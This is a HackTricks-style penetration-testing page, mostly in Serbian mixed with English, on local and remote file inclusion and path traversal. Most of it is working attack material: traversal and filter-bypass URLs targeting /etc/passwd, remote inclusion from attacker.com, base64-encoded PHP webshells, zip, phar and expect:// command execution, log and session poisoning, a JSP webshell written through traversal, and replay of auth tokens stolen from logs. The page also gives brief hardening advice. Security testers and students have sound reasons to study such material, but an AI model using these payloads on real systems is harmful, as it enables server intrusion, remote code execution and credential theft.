# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Datoteka se učitava sa udaljenog servera (Najbolje: možete napisati kod i server će ga izvršiti). In php ovo je po defaultu **onemogućeno** (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalnu datoteku.

Ranljivost nastaje kada korisnik na neki način može kontrolisati koju će datoteku server učitati.

Ranjive **PHP funkcije**: require, require_once, include, include_once

Zanimljiv alat za eksploatisanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kombinovao sam nekoliko \*nix LFI lista i dodao više putanja; napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe da zamenite `/` sa `\`\
Pokušajte такође да додате `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte такоđe да zamenite `/` са `\`\
Pokušajte такође да uklonite `C:/` и додате `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu linux.

## Osnovni LFI i bypasses

Svi primeri su za Local File Inclusion ali se mogu primeniti i na Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sekvence uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja više karaktera na kraju prosleđenog niza (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Možete koristiti nestandardna kodiranja kao što su double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojećeg direktorijuma

Možda back-end proverava putanju foldera:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma fajl-sistema na serveru

Fajl-sistem servera može se rekurzivno istražiti kako bi se identifikovali direktorijumi, a ne samo fajlovi, koristeći određene tehnike. Ovaj proces uključuje utvrđivanje dubine direktorijuma i ispitivanje postojanja određenih direktorijuma. Ispod sledi detaljna metoda za to:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu vašeg trenutnog direktorijuma tako što ćete uspešno dohvatiti `/etc/passwd` fajl (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturisan na sledeći način, što ukazuje na dubinu tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Provera direktorijuma:** Dodajte ime sumnjivog direktorijuma (npr. `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje parametra depth za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Protumačite rezultate:** Odgovor servera pokazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisustvo direktorijuma `private` je potvrđeno.
4. **Rekurzivno istraživanje:** Pronađeni direktorijumi se mogu dalje ispitivati radi poddirektorijuma ili fajlova koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na drugim lokacijama u fajl sistemu, prilagodite payload odgovarajuće. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup ograničenim fajlovima zaobilaženjem određenih bezbednosnih mera koje dopisuju dodatne karaktere na kraj putanja fajlova. Cilj je konstruisati putanju fajla koja, nakon što je bezbednosna mera izmeni, i dalje pokazuje na željeni fajl.

U PHP-u, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
- Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

Sledeći primeri pokazuju kako iskoristiti path truncation za pristup `/etc/passwd`, čestoj meti zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversala može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Korišćenje dot segmenata i dodatnih karaktera**: Traversal sekvence (`../`) u kombinaciji sa dodatnim dot segmentima i karakterima mogu se koristiti za navigaciju fajl-sistemom, efektivno ignorišući dodate stringove od strane servera.
- **Utvrđivanje potrebnog broja traversala**: Metodom pokušaja i grešaka može se pronaći tačan broj `../` sekvenci potrebnih da se dođe do root direktorijuma, a potom do `/etc/passwd`, pri čemu su svi dodati stringovi (kao `.php`) neutralisani, ali željeni put (`/etc/passwd`) ostaje netaknut.
- **Početak sa lažnim direktorijumom**: Uobičajena praksa je da se put počne nepostojećim direktorijumom (na primer `a/`). Ova tehnika se koristi kao preventivna mera ili da bi se ispunili zahtevi parsiranja putanje od strane servera.

Prilikom korišćenja tehnika za truncation putanja, ključno je razumeti ponašanje parsiranja putanja servera i strukturu fajl-sistema. Svaki scenarij može zahtevati drugačiji pristup, i često je potrebno testiranje da bi se našla najefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Trikovi za zaobilaženje filtera**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno podrazumevano jer je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako je iz nekog razloga **`allow_url_include`** **On**, ali PHP **filtrira** pristup eksternim web stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protokol sa base64 da dekodirate b64 PHP kod i egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, završni `+.txt` je dodat zato što je attacker trebao string koji se završava sa `.txt`, pa se string završava tim i nakon b64 decode-a taj deo će vratiti samo smeće, a pravi PHP kod će biti uključen (i samim tim izvršen).

Još jedan primer **koji ne koristi `php://` protokol** bio bi:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U Python kodu kao u sledećem primeru:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** parametru **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ovo je predviđeno ponašanje u skladu sa [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne putanje.

## Java Lista direktorijuma

Čini se da ako imate Path Traversal u Javi i **zatražite direktorijum** umesto fajla, biće vraćena **lista direktorijuma**. Ovo se, koliko ja znam (afaik), neće dešavati u drugim jezicima.

## Top 25 parametara

Evo liste 25 parametara koji mogu biti ranjivi na local file inclusion (LFI) (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters dozvoljavaju izvođenje osnovnih **operacija modifikacije nad podacima** pre nego što se oni pročitaju ili upišu. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između "<" i ">" karaktera)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformiše u drugačiji encoding(`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih enkodinga** koje podržava, pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (useful if exfiltrating a lot of info)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*`: Zastarelo
- `mdecrypt.*`: Zastarelo
- Other Filters
- Pokretanjem u php `var_dump(stream_get_filters());` možete naći par **neočekivanih filtera**:
- `consumed`
- `dechunk`: vraća (reverzuje) HTTP chunked kodiranje
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika i mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) predlaže tehniku za čitanje lokalnog fajla bez vraćanja output-a sa servera. Tehnika se zasniva na **boolean exfiltration of the file (char by char) using php filters** kao oracle. To je zato što php filters mogu da se iskoriste da tekst postane dovoljno veliki da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak pregled:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Ovo će se koristiti da se generiše tekst toliko veliki kada je početno slovo pogodjeno tačno da će php pokrenuti **error**.
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima u zavisnosti od pogođenog slova), omogućava da pogodimo slovo na početku teksta posmatrajući kada dovoljan broj transformacija učini da ono prestane da bude heksadecimalni karakter. Ako je hex, dechunk ga neće obrisati i početna bomba će izazvati php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** it is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea is to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and **delete the data until the junk data** (ovo će ukloniti prva 2 bajta početnog teksta). Nastavite to dok ne dođete do željenog bita za leak.

U postu je takođe objavljen alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptors koje proces ima otvorene. Potencijalno koristan za exfiltrate sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout and php://stderr** da pristupite **file descriptors 0, 1 and 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// and rar://

Otpremite Zip ili Rar fajl sa PHPShell-om unutra i pristupite mu.\
Da biste mogli zloupotrebiti rar protocol, **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršiti kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` fajl se može iskoristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije poput `include` za učitavanje fajlova. Donji PHP kod prikazuje kreiranje `.phar` fajla:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` fajl, treba izvršiti sledeću naredbu:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda unutar njega, preko funkcija kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()`, može se pokušati eksploatisati deserialization ranjivost. Ova ranjivost je povezana sa čitanjem fajlova koristeći `phar` protokol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Vrlo kratak rezime: **3 byte overflow** u PHP heap-u je zloupotrebljen da bi se **alter the chain of free chunks** određene veličine kako bi se moglo **write anything in any address**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunk-ove specifičnih veličina zloupotrebom više php filtera.

### Više protokola

Pogledajte više mogućih[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Piše u memoriju ili u privremeni fajl (nije jasno kako bi ovo bilo korisno u a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristup lokalnom fajl sistemu
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristup FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresioni streamovi
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalazi putanje koje odgovaraju obrascu (Ne vraća ništa štampivo, tako da nije zaista korisno ovde)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streamovi (Nije korisno za čitanje proizvoljnih fajlova)

## LFI via PHP's 'assert'

Rizik od Local File Inclusion (LFI) u PHP-u je posebno visok kada se radi o 'assert' funkciji, koja može izvršavati kod unutar stringova. Ovo je naročito problematično ako se ulaz koji sadrži karaktere za directory traversal poput ".." proverava ali nije pravilno sanitizovan.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je ovo namenjeno da spreči traversal, to nenamerno stvara vektor za code injection. Da bi se ovo iskoristilo za čitanje sadržaja fajla, napadač bi mogao da upotrebi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima gde vi **kontrolišete** **putanju fajla** koju koristi **PHP function** koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (kao jednostavan poziv **`file()`**) jer sadržaj nije prikazan.

U [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) je objašnjeno kako se blind path traversal može zloupotrebiti putem PHP filtera da bi se **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla bio toliko **big** da će **PHP function opening** fajl izazvati **error**.

Zatim, da bi se leak-ovao prvi char, koristi se filter **`dechunk`** zajedno sa drugim poput **base64** ili **rot13**, i na kraju se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da bi se **place other chars at the beggining and leak them**.

**Funkcije koje bi mogle biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prima/otprema fajlove gradi destinacionu putanju koristeći podatke kontrolisane od strane korisnika (npr. filename ili URL) bez canonicalising i validacije, `..` segments i absolute paths mogu pobjeći iz predviđenog direktorijuma i prouzrokovati arbitrary file write. Ako možete postaviti payload u web-exposed direktorijum, obično dobijate unauthenticated RCE tako što ostavite webshell.

Tipičan tok eksploatacije:
- Identifikujte write primitive u endpoint-u ili background worker-u koji prihvata path/filename i upisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed direktorijume. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sastavite traversal path koji izlazi iz nameravanog storage direktorijuma u webroot, i ubacite sadržaj vašeg webshell-a.
- Otvorite ubaceni payload u pregledaču i izvršite komande.

Napomene:
- Usluga koja vrši upis može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije servirati vaš payload.
- Na Java stack-ovima, ovi upisi fajlova su često implementirani prostom concatenation-om `File`/`Paths`. Nedostatak canonicalisation/allow-listing je osnovna mana.

Generički XML/JMF-style primer (product schemas vary – the DOCTYPE/body wrapper je irelevantan za traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening koje onemogućava ovu klasu grešaka:
- Normalizujte put na kanonski path i osigurajte da je potomak osnovnog direktorijuma koji je na listi dozvoljenih.
- Odbacite svaku putanju koja sadrži `..`, apsolutne putanje ili slova disk jedinica; preferirajte generisane nazive fajlova.
- Pokrenite writer pod nalogom sa niskim privilegijama i odvojite direktorijume za upis od direktorijuma koji se serviraju.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Preko Apache/Nginx log fajla

Ako je Apache ili Nginx server **vulnerable to LFI** unutar include function, možete pokušati pristupiti **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, upisati u **user agent** ili u **GET parameter** php shell kao **`<?php system($_GET['c']); ?>`** i uključiti taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite double quotes** za shell umesto **simple quotes**, dupla navodnika će biti izmenjena u string "_**quote;**_", **PHP će baciti grešku** i **ništa drugo neće biti izvršeno**.
>
> Takođe, pobrinite se da **ispravno napišete payload** ili će PHP prijavljivati grešku svaki put kada pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima, ali **budite oprezni,** kod unutar logova može biti URL encoded i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i to se dekodira u logovima. The PHPShell could be inserted inside this header.\
Drugi mogući putevi do log fajlova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Pročitajte access logove da sakupite GET-based auth tokens (token replay)

Mnoge aplikacije greškom prihvataju session/auth tokene preko GET (npr., AuthenticationToken, token, sid). Ako imate path traversal/LFI primitive do web server logova, možete ukrasti te tokene iz access logova i replay-ovati ih da potpuno zaobiđete autentifikaciju.

How-to:
- Iskoristite traversal/LFI da pročitate web server access log. Uobičajene lokacije:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Neki endpoints vraćaju file reads Base64-encoded. Ako je tako, dekodirajte lokalno i pregledajte log linije.
- Koristite grep za GET zahteve koji uključuju token parametar i zabeležite njegovu vrednost, zatim je replay-ujte na application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodirajte telo ako je Base64, zatim replay a captured token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Napomene:
- Tokens in URLs se podrazumevano beleže; nikada ne prihvatajte bearer tokens preko GET u produkcionim sistemima.
- Ako aplikacija podržava više imena tokena, pretražite uobičajene ključeve kao što su AuthenticationToken, token, sid, access_token.
- Rotirajte sve tokens koji su možda leaked u logovima.

### Putem e-pošte

**Pošaljite mejl** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da include-ujete u mejl korisnika putanjom poput **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/*/fd/*

1. Upload-ujte mnogo shells (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), sa $PID = PID procesa (može biti brute forced) i $FD file descriptor (takođe može biti brute forced)

### Putem /proc/self/environ

Kao kod log fajla, pošaljite payload u User-Agent, biće reflektovan unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem upload-a

Ako možete uraditi upload fajla, samo ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl ostao čitljiv, najbolje je ubaciti u metapodatke slika/doc/pdf

### Putem upload-a ZIP fajla

Otpremite ZIP fajl koji sadrži kompresovan PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ fajlovima
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristite LFI da uključite PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte pristupiti **\<HOME>/.ssh/id_rsa**

### **Preko** **vsftpd** _**logs**_

Logovi za FTP server vsftpd nalaze se u _**/var/log/vsftpd.log**_. Ako postoji Local File Inclusion (LFI) ranjivost i pristup izloženom vsftpd serveru je moguć, mogu se razmotriti sledeći koraci:

1. Injektujte PHP payload u username polje tokom login procesa.
2. Nakon injekcije, iskoristite LFI da preuzmete server logove iz _**/var/log/vsftpd.log**_.

### Putem php base64 filter (koristeći base64)

Kao što je prikazano u [ovom](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter jednostavno ignoriše Non-base64. To možete iskoristiti da zaobiđete proveru ekstenzije fajla: ako dostavite base64 koji se završava sa ".php", on će jednostavno ignorisati "." i dodati "php" na base64. Evo primera payloada:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filters (nije potreban fajl)

